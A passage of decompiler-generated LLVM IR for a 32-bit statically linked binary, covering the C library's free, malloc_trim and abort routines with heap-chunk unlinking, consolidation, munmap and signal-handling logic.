  %v0_8054875 = load i32, i32* @edx, align 4
  %v1_8054877 = add i32 %v0_8054875, 52
  store i32 %v1_8054877, i32* %eax.global-to-local, align 4
  %v2_805487a = add i32 %v0_8054875, 44
  %v3_805487a = inttoptr i32 %v2_805487a to i32*
  store i32 %v1_8054877, i32* %v3_805487a, align 4
  %v1_805487f = call i32 @sysconf(i32 30)
  store i32 %v1_805487f, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_805488b = add i32 %tmp11, 860
  %v3_805488b = inttoptr i32 %v2_805488b to i32*
  store i32 %v1_805487f, i32* %v3_805488b, align 4
  br label %dec_label_pc_8054891

dec_label_pc_8054891:                             ; preds = %dec_label_pc_8054809, %dec_label_pc_8054831
  store i32 %v0_80546f4, i32* @ebx, align 4
  store i32 %v0_80546f3, i32* @esi, align 4
  store i32 %v0_80546f2, i32* @edi, align 4
  %v0_8054898 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8054898

; uselistorder directives
  uselistorder i32 %v0_8054829, { 1, 0 }
  uselistorder i32 %v0_80547e5, { 1, 0 }
  uselistorder i32 %v1_80547a3, { 1, 0 }
  uselistorder i32 %v2_805479c, { 1, 0 }
  uselistorder i32 %v1_8054794, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80547a0, { 1, 0 }
  uselistorder i32 %v3_805474f, { 2, 1, 3, 0 }
  uselistorder i32 %v0_805476c, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8054749, { 1, 0, 3, 2 }
  uselistorder i32* %v3_80547fa, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8054891, { 1, 0 }
  uselistorder label %dec_label_pc_805481d, { 1, 0 }
  uselistorder label %dec_label_pc_80547fd, { 1, 0 }
  uselistorder label %dec_label_pc_80547c9, { 1, 0 }
  uselistorder label %dec_label_pc_80547c1, { 1, 0 }
  uselistorder label %dec_label_pc_805478c, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8054899 = load i32, i32* @ebp, align 4
  %v0_805489a = load i32, i32* @edi, align 4
  %v0_805489b = load i32, i32* @esi, align 4
  %v0_805489c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80548a4 = icmp eq i32 %arg1, 0
  br i1 %v1_80548a4, label %dec_label_pc_8054a2d, label %dec_label_pc_80548ac

dec_label_pc_80548ac:                             ; preds = %entry
  %v2_80548b7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80548b7, i32* @eax, align 4
  %v2_80548bc = call i32 @__pthread_return_void(i32 %v2_80548b7, i32 134567263)
  store i32 %v2_80548bc, i32* %eax.global-to-local, align 4
  %v1_80548c8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e330.521 to i32))
  %v1_80548cd = add i32 %arg1, -8
  store i32 %v1_80548cd, i32* @ecx, align 4
  %v0_80548d0 = load i8, i8* @global_var_80647a0.522, align 1
  %v1_80548d0 = sext i8 %v0_80548d0 to i32
  store i32 %v1_80548d0, i32* %eax.global-to-local, align 4
  %v1_80548d5 = add i32 %arg1, -4
  %v2_80548d5 = inttoptr i32 %v1_80548d5 to i32*
  %v3_80548d5 = load i32, i32* %v2_80548d5, align 4
  store i32 %v3_80548d5, i32* @edx, align 4
  %v1_80548dd = and i32 %v3_80548d5, -4
  %v4_80548dd = trunc i32 %v1_80548dd to i8
  store i32 %v1_80548dd, i32* @ebx, align 4
  %v8_80548e2 = icmp ugt i8 %v4_80548dd, %v0_80548d0
  br i1 %v8_80548e2, label %dec_label_pc_8054904, label %dec_label_pc_80548e4

dec_label_pc_80548e4:                             ; preds = %dec_label_pc_80548ac
  %v1_80548e4 = or i32 %v1_80548d0, 3
  %v3_80548e4 = trunc i32 %v1_80548e4 to i8
  store i32 %v1_80548e4, i32* %eax.global-to-local, align 4
  %v2_80548e7 = udiv i32 %v3_80548d5, 8
  store i8 %v3_80548e4, i8* @global_var_80647a0.522, align 32
  %v1_80548ef = mul nuw i32 %v2_80548e7, 4
  %v2_80548ef = add i32 %v1_80548ef, ptrtoint (i8* @global_var_80647a0.522 to i32)
  store i32 %v2_80548ef, i32* @edx, align 4
  %v1_80548f6 = add i32 %v1_80548ef, add (i32 ptrtoint (i8* @global_var_80647a0.522 to i32), i32 -4)
  %v2_80548f6 = inttoptr i32 %v1_80548f6 to i32*
  %v3_80548f6 = load i32, i32* %v2_80548f6, align 4
  store i32 %v3_80548f6, i32* %eax.global-to-local, align 4
  %v3_80548f9 = inttoptr i32 %arg1 to i32*
  store i32 %v3_80548f6, i32* %v3_80548f9, align 4
  %v0_80548fc = load i32, i32* @ecx, align 4
  %v1_80548fc = load i32, i32* @edx, align 4
  %v2_80548fc = add i32 %v1_80548fc, -4
  %v3_80548fc = inttoptr i32 %v2_80548fc to i32*
  store i32 %v0_80548fc, i32* %v3_80548fc, align 4
  br label %dec_label_pc_8054a1c

dec_label_pc_8054904:                             ; preds = %dec_label_pc_80548ac
  %v2_8054904 = and i32 %v3_80548d5, 2
  %v3_8054904 = icmp eq i32 %v2_8054904, 0
  %v1_8054907 = icmp eq i1 %v3_8054904, false
  br i1 %v1_8054907, label %dec_label_pc_80549fc, label %dec_label_pc_805490d

dec_label_pc_805490d:                             ; preds = %dec_label_pc_8054904
  %v1_805490d = or i32 %v1_80548d0, 1
  %v3_805490d = trunc i32 %v1_805490d to i8
  store i32 %v1_805490d, i32* %eax.global-to-local, align 4
  store i8 %v3_805490d, i8* @global_var_80647a0.522, align 32
  %v2_8054915 = add i32 %v1_80548dd, %v1_80548cd
  store i32 %v2_8054915, i32* @esi, align 4
  %v1_8054918 = add i32 %v2_8054915, 4
  %v2_8054918 = inttoptr i32 %v1_8054918 to i32*
  %v3_8054918 = load i32, i32* %v2_8054918, align 4
  store i32 %v3_8054918, i32* %eax.global-to-local, align 4
  %v2_805491f = inttoptr i32 %v1_80548d5 to i8*
  %v3_805491f = load i8, i8* %v2_805491f, align 1
  %v4_805491f = urem i8 %v3_805491f, 2
  %v5_805491f = icmp eq i8 %v4_805491f, 0
  %v1_8054923 = icmp eq i1 %v5_805491f, false
  br i1 %v1_8054923, label %dec_label_pc_8054946, label %dec_label_pc_8054925

dec_label_pc_8054925:                             ; preds = %dec_label_pc_805490d
  %v2_8054925 = inttoptr i32 %v1_80548cd to i32*
  %v3_8054925 = load i32, i32* %v2_8054925, align 4
  store i32 %v3_8054925, i32* @ebp, align 4
  %v2_805492a = sub i32 %v1_80548cd, %v3_8054925
  store i32 %v2_805492a, i32* %eax.global-to-local, align 4
  %v1_805492c = add i32 %v2_805492a, 8
  %v2_805492c = inttoptr i32 %v1_805492c to i32*
  %v3_805492c = load i32, i32* %v2_805492c, align 4
  store i32 %v3_805492c, i32* @edi, align 4
  %v1_805492f = add i32 %v2_805492a, 12
  %v2_805492f = inttoptr i32 %v1_805492f to i32*
  %v3_805492f = load i32, i32* %v2_805492f, align 4
  store i32 %v3_805492f, i32* @edx, align 4
  %v1_8054932 = add i32 %v3_805492c, 12
  %v2_8054932 = inttoptr i32 %v1_8054932 to i32*
  %v3_8054932 = load i32, i32* %v2_8054932, align 4
  store i32 %v3_8054932, i32* @ecx, align 4
  %v12_8054935 = icmp eq i32 %v3_8054932, %v2_805492a
  %v1_8054937 = icmp eq i1 %v12_8054935, false
  br i1 %v1_8054937, label %dec_label_pc_8054975, label %dec_label_pc_8054939

dec_label_pc_8054939:                             ; preds = %dec_label_pc_8054925
  %v1_8054939 = add i32 %v3_805492f, 8
  %v2_8054939 = inttoptr i32 %v1_8054939 to i32*
  %v3_8054939 = load i32, i32* %v2_8054939, align 4
  %v15_8054939 = icmp eq i32 %v3_8054939, %v3_8054932
  %v1_805493c = icmp eq i1 %v15_8054939, false
  br i1 %v1_805493c, label %dec_label_pc_8054975, label %dec_label_pc_805493e

dec_label_pc_805493e:                             ; preds = %dec_label_pc_8054939
  %v2_805493e = add i32 %v3_8054925, %v1_80548dd
  store i32 %v2_805493e, i32* @ebx, align 4
  store i32 %v3_805492f, i32* %v2_8054932, align 4
  %v0_8054943 = load i32, i32* @edi, align 4
  %v1_8054943 = load i32, i32* @edx, align 4
  %v2_8054943 = add i32 %v1_8054943, 8
  %v3_8054943 = inttoptr i32 %v2_8054943 to i32*
  store i32 %v0_8054943, i32* %v3_8054943, align 4
  %v0_805494d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8054946

dec_label_pc_8054946:                             ; preds = %dec_label_pc_805490d, %dec_label_pc_805493e
  %v1_8054959 = phi i32 [ %v2_8054915, %dec_label_pc_805490d ], [ %v0_805494d.pre, %dec_label_pc_805493e ]
  %v1_805494a = and i32 %v3_8054918, -4
  store i32 %v1_805494a, i32* @ebp, align 4
  %v1_805494d = load i32, i32* @global_var_80647cc.523, align 4
  %v12_805494d = icmp eq i32 %v1_8054959, %v1_805494d
  br i1 %v12_805494d, label %dec_label_pc_80549a7, label %dec_label_pc_8054955

dec_label_pc_8054955:                             ; preds = %dec_label_pc_8054946
  %v2_8054955 = add i32 %v1_8054959, 4
  %v3_8054955 = add i32 %v2_8054955, %v1_805494a
  %v4_8054955 = inttoptr i32 %v3_8054955 to i32*
  %v5_8054955 = load i32, i32* %v4_8054955, align 4
  store i32 %v5_8054955, i32* %eax.global-to-local, align 4
  %v3_8054959 = inttoptr i32 %v2_8054955 to i32*
  store i32 %v1_805494a, i32* %v3_8054959, align 4
  %v0_805495c = load i32, i32* %eax.global-to-local, align 4
  %v1_805495c = urem i32 %v0_805495c, 2
  %v2_805495c = icmp eq i32 %v1_805495c, 0
  store i32 %v1_805495c, i32* %eax.global-to-local, align 4
  %v1_8054961 = icmp eq i1 %v2_805495c, false
  br i1 %v1_8054961, label %dec_label_pc_8054982, label %dec_label_pc_8054963

dec_label_pc_8054963:                             ; preds = %dec_label_pc_8054955
  %v0_8054963 = load i32, i32* @esi, align 4
  %v1_8054963 = add i32 %v0_8054963, 8
  %v2_8054963 = inttoptr i32 %v1_8054963 to i32*
  %v3_8054963 = load i32, i32* %v2_8054963, align 4
  store i32 %v3_8054963, i32* @edx, align 4
  %v1_8054966 = add i32 %v0_8054963, 12
  %v2_8054966 = inttoptr i32 %v1_8054966 to i32*
  %v3_8054966 = load i32, i32* %v2_8054966, align 4
  store i32 %v3_8054966, i32* %eax.global-to-local, align 4
  %v1_8054969 = add i32 %v3_8054963, 12
  %v2_8054969 = inttoptr i32 %v1_8054969 to i32*
  %v3_8054969 = load i32, i32* %v2_8054969, align 4
  store i32 %v3_8054969, i32* @edi, align 4
  %v12_805496c = icmp eq i32 %v3_8054969, %v0_8054963
  %v1_805496e = icmp eq i1 %v12_805496c, false
  br i1 %v1_805496e, label %dec_label_pc_8054975, label %dec_label_pc_8054970

dec_label_pc_8054970:                             ; preds = %dec_label_pc_8054963
  %v1_8054970 = add i32 %v3_8054966, 8
  %v2_8054970 = inttoptr i32 %v1_8054970 to i32*
  %v3_8054970 = load i32, i32* %v2_8054970, align 4
  %v15_8054970 = icmp eq i32 %v3_8054970, %v3_8054969
  br i1 %v15_8054970, label %dec_label_pc_805497a, label %dec_label_pc_8054975

dec_label_pc_8054975:                             ; preds = %dec_label_pc_8054970, %dec_label_pc_8054963, %dec_label_pc_8054939, %dec_label_pc_8054925
  %v0_8054975 = call i32 @abort()
  store i32 %v0_8054975, i32* %eax.global-to-local, align 4
  %v1_805497a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805497a

dec_label_pc_805497a:                             ; preds = %dec_label_pc_8054970, %dec_label_pc_8054975
  %v1_805497a = phi i32 [ %v3_8054963, %dec_label_pc_8054970 ], [ %v1_805497a.pre, %dec_label_pc_8054975 ]
  %v0_805497a = phi i32 [ %v3_8054966, %dec_label_pc_8054970 ], [ %v0_8054975, %dec_label_pc_8054975 ]
  %v2_805497a = add i32 %v1_805497a, 12
  %v3_805497a = inttoptr i32 %v2_805497a to i32*
  store i32 %v0_805497a, i32* %v3_805497a, align 4
  %v0_805497d = load i32, i32* @ebx, align 4
  %v1_805497d = load i32, i32* @ebp, align 4
  %v2_805497d = add i32 %v1_805497d, %v0_805497d
  store i32 %v2_805497d, i32* @ebx, align 4
  %v0_805497f = load i32, i32* @edx, align 4
  %v1_805497f = load i32, i32* %eax.global-to-local, align 4
  %v2_805497f = add i32 %v1_805497f, 8
  %v3_805497f = inttoptr i32 %v2_805497f to i32*
  store i32 %v0_805497f, i32* %v3_805497f, align 4
  br label %dec_label_pc_8054982

dec_label_pc_8054982:                             ; preds = %dec_label_pc_8054955, %dec_label_pc_805497a
  %v0_8054982 = load i32, i32* @global_var_80647dc.541, align 4
  store i32 %v0_8054982, i32* %eax.global-to-local, align 4
  %v0_8054987 = load i32, i32* @ecx, align 4
  %v1_8054987 = add i32 %v0_8054987, 12
  %v2_8054987 = inttoptr i32 %v1_8054987 to i32*
  store i32 ptrtoint (i32* @global_var_80647d4.525 to i32), i32* %v2_8054987, align 4
  %v0_805498e = load i32, i32* @ebx, align 4
  %v1_805498e = load i32, i32* @ecx, align 4
  %v3_805498e = add i32 %v1_805498e, %v0_805498e
  %v4_805498e = inttoptr i32 %v3_805498e to i32*
  store i32 %v0_805498e, i32* %v4_805498e, align 4
  %v0_8054991 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054991 = load i32, i32* @ecx, align 4
  %v2_8054991 = add i32 %v1_8054991, 8
  %v3_8054991 = inttoptr i32 %v2_8054991 to i32*
  store i32 %v0_8054991, i32* %v3_8054991, align 4
  %v0_8054994 = load i32, i32* @ecx, align 4
  %v1_8054994 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054994 = add i32 %v1_8054994, 12
  %v3_8054994 = inttoptr i32 %v2_8054994 to i32*
  store i32 %v0_8054994, i32* %v3_8054994, align 4
  %v0_8054997 = load i32, i32* @ebx, align 4
  %v1_8054999 = or i32 %v0_8054997, 1
  store i32 %v1_8054999, i32* %eax.global-to-local, align 4
  %v0_805499c = load i32, i32* @ecx, align 4
  store i32 %v0_805499c, i32* @global_var_80647dc.541, align 4
  %v2_80549a2 = add i32 %v0_805499c, 4
  %v3_80549a2 = inttoptr i32 %v2_80549a2 to i32*
  store i32 %v1_8054999, i32* %v3_80549a2, align 4
  br label %dec_label_pc_80549b7

dec_label_pc_80549a7:                             ; preds = %dec_label_pc_8054946
  %v0_80549a7 = load i32, i32* @ebx, align 4
  %v2_80549a7 = add i32 %v0_80549a7, %v1_805494a
  store i32 %v2_80549a7, i32* @ebx, align 4
  %v1_80549ab = or i32 %v2_80549a7, 1
  store i32 %v1_80549ab, i32* %eax.global-to-local, align 4
  %v1_80549ae = load i32, i32* @ecx, align 4
  %v2_80549ae = add i32 %v1_80549ae, 4
  %v3_80549ae = inttoptr i32 %v2_80549ae to i32*
  store i32 %v1_80549ab, i32* %v3_80549ae, align 4
  %v0_80549b1 = load i32, i32* @ecx, align 4
  store i32 %v0_80549b1, i32* @global_var_80647cc.523, align 4
  br label %dec_label_pc_80549b7

dec_label_pc_80549b7:                             ; preds = %dec_label_pc_8054982, %dec_label_pc_80549a7
  %v0_80549b7 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_80549b7, 131072
  br i1 %tmp, label %dec_label_pc_8054a1c, label %dec_label_pc_80549bf

dec_label_pc_80549bf:                             ; preds = %dec_label_pc_80549b7
  %v0_80549bf = load i8, i8* @global_var_80647a0.522, align 32
  %v1_80549bf = and i8 %v0_80549bf, 2
  %v2_80549bf = icmp eq i8 %v1_80549bf, 0
  br i1 %v2_80549bf, label %dec_label_pc_80549d8, label %dec_label_pc_80549c8

dec_label_pc_80549c8:                             ; preds = %dec_label_pc_80549bf
  %v2_80549d0 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80647a0.522 to i32*))
  store i32 %v2_80549d0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80549d8

dec_label_pc_80549d8:                             ; preds = %dec_label_pc_80549bf, %dec_label_pc_80549c8
  %v0_80549d8 = load i32, i32* @global_var_80647cc.523, align 4
  store i32 %v0_80549d8, i32* %eax.global-to-local, align 4
  %v1_80549dd = add i32 %v0_80549d8, 4
  %v2_80549dd = inttoptr i32 %v1_80549dd to i32*
  %v3_80549dd = load i32, i32* %v2_80549dd, align 4
  %v1_80549e0 = and i32 %v3_80549dd, -4
  store i32 %v1_80549e0, i32* %eax.global-to-local, align 4
  %v1_80549e3 = load i32, i32* @global_var_8064ae4.539, align 4
  %v7_80549e3 = icmp ult i32 %v1_80549e0, %v1_80549e3
  br i1 %v7_80549e3, label %dec_label_pc_8054a1c, label %dec_label_pc_80549eb

dec_label_pc_80549eb:                             ; preds = %dec_label_pc_80549d8
  %v0_80549eb = load i32, i32* @global_var_8064ae8.537, align 8
  store i32 %v0_80549eb, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_80647a0.522 to i32), i32* @edx, align 4
  %v0_80549f5 = call i32 @__malloc_trim()
  store i32 %v0_80549f5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054a1c

dec_label_pc_80549fc:                             ; preds = %dec_label_pc_8054904
  %v2_80549fc = inttoptr i32 %v1_80548cd to i32*
  %v3_80549fc = load i32, i32* %v2_80549fc, align 4
  %v0_80549ff = load i32, i32* @global_var_8064af0.530, align 16
  %v1_80549ff = add i32 %v0_80549ff, -1
  store i32 %v1_80549ff, i32* @global_var_8064af0.530, align 16
  %v2_8054a05 = add i32 %v3_80549fc, %v1_80548dd
  store i32 %v2_8054a05, i32* %eax.global-to-local, align 4
  %v2_8054a08 = sub i32 %v1_80548cd, %v3_80549fc
  %v0_8054a0e = load i32, i32* @global_var_8064b04.534, align 4
  %v2_8054a0e = sub i32 %v0_8054a0e, %v2_8054a05
  store i32 %v2_8054a0e, i32* @global_var_8064b04.534, align 4
  %v4_8054a14 = call i32 @munmap(i32 %v2_8054a08, i32 %v2_8054a05, i32 %v1_80548dd, i32 %v1_80548dd)
  store i32 %v4_8054a14, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054a1c

dec_label_pc_8054a1c:                             ; preds = %dec_label_pc_80549d8, %dec_label_pc_80549b7, %dec_label_pc_80549eb, %dec_label_pc_80548e4, %dec_label_pc_80549fc
  store i32 %v2_80548b7, i32* @eax, align 4
  %v2_8054a25 = call i32 @__pthread_return_void(i32 %v2_80548b7, i32 1)
  store i32 %v2_8054a25, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054a2d

dec_label_pc_8054a2d:                             ; preds = %entry, %dec_label_pc_8054a1c
  %.0 = phi i32 [ undef, %entry ], [ %v2_8054a25, %dec_label_pc_8054a1c ]
  store i32 %v0_805489c, i32* @ebx, align 4
  store i32 %v0_805489b, i32* @esi, align 4
  store i32 %v0_805489a, i32* @edi, align 4
  store i32 %v0_8054899, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_80549fc, { 1, 0 }
  uselistorder i32 %v0_805498e, { 1, 0 }
  uselistorder i32 %v1_805495c, { 1, 0 }
  uselistorder i32 %v2_8054955, { 1, 0 }
  uselistorder i32 %v1_805494a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8054959, { 1, 0 }
  uselistorder i32 %v1_80548dd, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_80548d5, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80548cd, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 undef, { 1, 0 }
  uselistorder i32* bitcast (i8* @global_var_80647a0.522 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_80647d4.525 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_80647cc.523, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_8054a2d, { 1, 0 }
  uselistorder label %dec_label_pc_8054a1c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80549d8, { 1, 0 }
  uselistorder label %dec_label_pc_80549b7, { 1, 0 }
  uselistorder label %dec_label_pc_8054982, { 1, 0 }
  uselistorder label %dec_label_pc_805497a, { 1, 0 }
  uselistorder label %dec_label_pc_8054946, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8054a35 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8054a42 = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_80647a0.522 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_80647a0.522 to i32), i32* @edx, align 4
  %v0_8054a4f = load i32, i32* @ebx, align 4
  store i32 %v0_8054a4f, i32* @eax, align 4
  store i32 %v0_8054a35, i32* @ebx, align 4
  %v0_8054a52 = call i32 @__malloc_trim()
  ret i32 %v0_8054a52

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_80647a0.522 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_80647a0.522, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8054a64 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e348.542 to i32))
  %v12_8054a6e = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054a73

dec_label_pc_8054a73:                             ; preds = %dec_label_pc_8054a73.dec_label_pc_8054a73_crit_edge, %entry
  %v0_8054a73 = phi i32 [ %v12_8054a6e, %entry ], [ %v0_8054a73.pre, %dec_label_pc_8054a73.dec_label_pc_8054a73_crit_edge ]
  %v1_8054a7e19 = phi i32 [ 31, %entry ], [ %v1_8054a7e, %dec_label_pc_8054a73.dec_label_pc_8054a73_crit_edge ]
  %v2_8054a73 = mul i32 %v1_8054a7e19, 4
  %v3_8054a73 = add i32 %v2_8054a73, 152
  %v4_8054a73 = add i32 %v3_8054a73, %v0_8054a73
  %v5_8054a73 = inttoptr i32 %v4_8054a73 to i32*
  store i32 0, i32* %v5_8054a73, align 4
  %v0_8054a7e.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8054a7e = add i32 %v0_8054a7e.pre, -1
  %v9_8054a7e = icmp slt i32 %v1_8054a7e, 0
  store i32 %v1_8054a7e, i32* %eax.global-to-local, align 4
  %v1_8054a7f = icmp eq i1 %v9_8054a7e, false
  br i1 %v1_8054a7f, label %dec_label_pc_8054a73.dec_label_pc_8054a73_crit_edge, label %dec_label_pc_8054a81

dec_label_pc_8054a73.dec_label_pc_8054a73_crit_edge: ; preds = %dec_label_pc_8054a73
  %v0_8054a73.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054a73

dec_label_pc_8054a81:                             ; preds = %dec_label_pc_8054a73
  %v0_8054a81 = load i32, i32* @ebx, align 4
  %v2_8054a85 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8054a85, i32* @ebx, align 4
  %v4_8054a8d = call i32 @__sigaddset(i32 %v2_8054a85, i32 6, i32 %v0_8054a81, i32 %v0_8054a81)
  store i32 %v4_8054a8d, i32* %eax.global-to-local, align 4
  %v1_8054a95 = icmp eq i32 %v4_8054a8d, 0
  %v1_8054a97 = icmp eq i1 %v1_8054a95, false
  br i1 %v1_8054a97, label %dec_label_pc_8054aa7, label %dec_label_pc_8054a99

dec_label_pc_8054a99:                             ; preds = %dec_label_pc_8054a81
  %v3_8054a9f = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8054a9f = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8054a9f, i32 0)
  store i32 %v4_8054a9f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054aa7

dec_label_pc_8054aa7:                             ; preds = %dec_label_pc_8054a81, %dec_label_pc_8054a99
  %v2_8054adf4 = phi i32 [ %v4_8054a8d, %dec_label_pc_8054a81 ], [ %v4_8054a9f, %dec_label_pc_8054a99 ]
  %v0_8054aa7 = load i8, i8* @global_var_80646c0.543, align 64
  %v1_8054aa7 = icmp eq i8 %v0_8054aa7, 0
  %v1_8054aae = icmp eq i1 %v1_8054aa7, false
  br i1 %v1_8054aae, label %dec_label_pc_8054adf, label %dec_label_pc_8054ab0

dec_label_pc_8054ab0:                             ; preds = %dec_label_pc_8054aa7
  store i8 1, i8* @global_var_80646c0.543, align 64
  br label %dec_label_pc_8054ab7

dec_label_pc_8054ab7:                             ; preds = %dec_label_pc_8054b1e, %dec_label_pc_8054ab0
  %v1_8054abf = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e348.542 to i32))
  store i32 %v1_8054abf, i32* %eax.global-to-local, align 4
  %v1_8054acb = call i32 @__raise(i32 6)
  store i32 %v1_8054acb, i32* %eax.global-to-local, align 4
  %v1_8054ad7 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e348.542 to i32))
  store i32 %v1_8054ad7, i32* %eax.global-to-local, align 4
  %v0_8054adf.pre = load i8, i8* @global_var_80646c0.543, align 64
  br label %dec_label_pc_8054adf

dec_label_pc_8054adf:                             ; preds = %dec_label_pc_8054aa7, %dec_label_pc_8054ab7
  %v2_8054adf = phi i32 [ %v2_8054adf4, %dec_label_pc_8054aa7 ], [ %v1_8054ad7, %dec_label_pc_8054ab7 ]
  %v0_8054adf = phi i8 [ %v0_8054aa7, %dec_label_pc_8054aa7 ], [ %v0_8054adf.pre, %dec_label_pc_8054ab7 ]
  %v1_8054adf = zext i8 %v0_8054adf to i32
  %v3_8054adf = and i32 %v2_8054adf, -256
  %v4_8054adf = or i32 %v1_8054adf, %v3_8054adf
  store i32 %v4_8054adf, i32* %eax.global-to-local, align 4
  %v10_8054ae4 = icmp eq i8 %v0_8054adf, 1
  %v1_8054ae6 = icmp eq i1 %v10_8054ae4, false
  br i1 %v1_8054ae6, label %dec_label_pc_8054b40, label %dec_label_pc_8054ae8

dec_label_pc_8054ae8:                             ; preds = %dec_label_pc_8054adf
  %v2_8054af0 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8054af0, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_80646c0.543, align 64
  %v3_8054afc = bitcast i32* %stack_var_-272 to i8*
  %v4_8054afc = call i32 @__GI_memset(i8* %v3_8054afc, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054b13

dec_label_pc_8054b13:                             ; preds = %dec_label_pc_8054b13.dec_label_pc_8054b13_crit_edge, %dec_label_pc_8054ae8
  %v0_8054b13 = phi i32 [ %v12_8054a6e, %dec_label_pc_8054ae8 ], [ %v0_8054b13.pre, %dec_label_pc_8054b13.dec_label_pc_8054b13_crit_edge ]
  %v1_8054b1b18 = phi i32 [ 31, %dec_label_pc_8054ae8 ], [ %v1_8054b1b, %dec_label_pc_8054b13.dec_label_pc_8054b13_crit_edge ]
  %v2_8054b13 = mul i32 %v1_8054b1b18, 4
  %v3_8054b13 = add i32 %v2_8054b13, 16
  %v4_8054b13 = add i32 %v3_8054b13, %v0_8054b13
  %v5_8054b13 = inttoptr i32 %v4_8054b13 to i32*
  store i32 -1, i32* %v5_8054b13, align 4
  %v0_8054b1b.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8054b1b = add i32 %v0_8054b1b.pre, -1
  %v9_8054b1b = icmp slt i32 %v1_8054b1b, 0
  store i32 %v1_8054b1b, i32* %eax.global-to-local, align 4
  %v1_8054b1c = icmp eq i1 %v9_8054b1b, false
  br i1 %v1_8054b1c, label %dec_label_pc_8054b13.dec_label_pc_8054b13_crit_edge, label %dec_label_pc_8054b1e

dec_label_pc_8054b13.dec_label_pc_8054b13_crit_edge: ; preds = %dec_label_pc_8054b13
  %v0_8054b13.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054b13

dec_label_pc_8054b1e:                             ; preds = %dec_label_pc_8054b13
  store i32 %v2_8054af0, i32* %eax.global-to-local, align 4
  %v4_8054b33 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8054b33, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054ab7

dec_label_pc_8054b40:                             ; preds = %dec_label_pc_8054adf
  %v10_8054b40 = icmp eq i8 %v0_8054adf, 2
  %v1_8054b42 = icmp eq i1 %v10_8054b40, false
  br i1 %v1_8054b42, label %dec_label_pc_8054b4c, label %dec_label_pc_8054b44

dec_label_pc_8054b44:                             ; preds = %dec_label_pc_8054b40
  store i8 3, i8* @global_var_80646c0.543, align 64
  br label %dec_label_pc_8054b4c

